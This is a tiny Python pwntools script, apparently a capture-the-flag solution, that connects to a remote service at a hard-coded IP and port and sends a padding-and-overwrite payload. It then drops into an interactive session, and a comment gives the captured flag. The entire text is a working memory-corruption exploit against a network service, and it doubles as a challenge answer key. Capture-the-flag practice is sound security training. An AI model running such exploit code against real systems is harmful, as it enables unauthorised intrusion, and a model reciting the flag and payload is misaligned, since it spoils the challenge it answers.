from pwn import *

r = remote('54.165.119.72', 21337)
payload = b'a' * 0x1C + b'\x27\xEA\x22\xEC'
r.sendline(payload)
r.interactive()

#Flag{!nt3g3r_0v3rFl0w_B4by}